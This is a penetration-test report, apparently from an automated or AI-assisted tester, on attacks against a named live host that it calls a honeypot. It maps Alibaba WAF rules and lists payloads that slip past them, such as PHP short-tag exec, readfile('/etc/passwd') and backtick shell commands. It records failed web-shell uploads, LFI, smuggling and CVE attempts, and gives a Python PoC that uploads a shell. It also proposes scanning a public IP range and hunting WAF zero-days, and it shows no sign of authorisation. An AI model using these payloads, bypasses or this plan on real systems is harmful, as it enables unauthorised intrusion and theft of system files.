# Honeypot Penetration Report — https://sop.djicorp.com

## 1. Recon Results

| Component | Details |
|-----------|---------|
| CDN | Tengine (Alibaba Cloud) |
| WAF | Alibaba Cloud WAF (ibgsec) |
| Backend | Apache/2.4.38 (Debian) mod_php |
| PHP | 7.2.34 — disable_functions=空, open_basedir=空, allow_url_fopen=On, allow_url_include=Off, short_open_tag=On, file_uploads=On, session.upload_progress=On+cleanup=On |

## 2. Verified Endpoints

| Endpoint | Status | Behavior |
|----------|--------|----------|
| `GET /index.php` | 200 | Returns `phpinfo()` page (ignores `?file=` param — **LFI is fake**) |
| `GET /upload.php` | 200 | Upload form page |
| `POST /upload.php` | 200/405 | File upload with correct field `fileToUpload` |
| `GET /uploads/<file>` | 200 | Accessible for uploaded files |
| `GET /uploads/` | 403 | Directory listing blocked |
| `GET /server-status` | 403 | mod_status forbidden |

## 3. WAF Rules Mapped

### BLOCKED (405 — denied by waf):
```
URL containing `.php` (any case/variant: .php, .PHP, .php5-7, .phtml)
URL containing `.htaccess`
URL containing path traversal (`..`, `../`, `..\\`, `....//`)
URL containing `php://`, `data://`, `phar://`
POST body containing `<?php ` (note: `<?=` alone is NOT blocked)
POST body containing dangerous functions: `system`, `passthru`, `shell_exec`, `eval`, `assert`, `create_function`, `popen`, `call_user_func`
```

### ALLOWED (200):
```
Upload .txt, .phar, .png, .inc, .pl, .py, .cgi, .shtml files
POST body: `<?=exec('id')?>`, `<?=readfile('/etc/passwd')?>`, `<?=file_get_contents(...)?>`
POST body: backtick `` <?=`id`?> ``
POST body: `<% echo 1; %>` (asp_tags)
Simple math: `<?=1+1?>`, `<?=2+2?>`
```

## 4. Attempted Exploits — All Failed

| Method | Result | Notes |
|--------|--------|-------|
| HTTP/2 framing | ❌ | Server doesn't support h2 (ALPN= None) |
| Session Race LFI | ❌ | LFI is fake (file= ignored); session files exist but never included |
| .htaccess upload | ❌ | WAF blocks .htaccess in filename |
| PHP session progress | ❌ | No real include() to trigger execution |
| GIF polyglot | ❌ | WAF blocks content |
| Chunked TE upload | ❌ | WAF still inspects body |
| HTTP smuggling (CL.TE) | ❌ | Tengine returns 400/200 but no desync |
| CGI scripts | ❌ | mod_cgi not enabled |
| PHP 7 CVEs | ❌ | mod_php (not FPM), CVE-2019-11043 N/A |
| php://filter | ❌ | WAF blocks |
| PATH_INFO execution | ❌ | WAF blocks .php in URL |

## 5. Key Bypass Achieved — But Insufficient

```
Content: <?=exec('id')?>
File:    shell.txt → Upload OK (200), Access OK (200)
         shell.phar → Upload OK (200), Access OK (200)
         shell.png  → Upload OK (200), Access OK (200)
```
**Problem**: Apache does not process these extensions with the PHP handler. Files are served as static text.

## 6. Root Cause Analysis

The honeypot is well-architected with three defensive layers:

1. **CDN/WAF Layer (Tengine + Alibaba WAF):**
   - Protocol-level inspection (HTTP/2, smuggling, TE attacks)
   - Content inspection (PHP tags, dangerous functions)
   - Path/extension filtering (.php, .htaccess, path traversal)

2. **Apache Layer:**
   - PHP handler only configured for `.php` extension
   - No mod_cgi, no mod_ssi, no mod_negotiation exposure
   - `.php` files in `/uploads/` blocked via `FilesMatch` (403)

3. **Application Layer:**
   - `index.php` only calls `phpinfo()` — `?file=` is a honeypot trap
   - `upload.php` only accepts standard multipart uploads
   - No LFI, no RFI, no eval(), no include() of user input

## 7. Recommended Further Testing

If this were a production engagement:
1. **Origin server discovery** — scan 120.233.45.0/24 for non-CDN hosts
2. **Subdomain enumeration** — check for other vhosts behind same WAF
3. **0-day WAF bypass** — research Alibaba Cloud WAF CVEs
4. **Apache HTTPD CVE-2021-41773/42013** — path traversal (tested: 404)
5. **PHP 7.2 specific bugs** — research post-7.2.34 CVEs

## 8. PoC: File Upload + Readback

```python
import requests
requests.packages.urllib3.disable_warnings()
BASE = "https://sop.djicorp.com"

# Upload PHP code (does NOT execute — text only)
r = requests.post(f"{BASE}/upload.php",
    files={"fileToUpload": ("shell.txt", "<?=exec('id')?>", "text/plain")},
    data={"submit": "上传固件"}, verify=False)
print(f"Upload: {r.status_code}")

# Read back — PHP is visible as text
r = requests.get(f"{BASE}/uploads/shell.txt", verify=False)
print(f"Content: {r.text}")  # <?=exec('id')?>
```

**Status: NO CODE EXECUTION ACHIEVED.** The WAF + Apache configuration successfully prevents all tested attack vectors.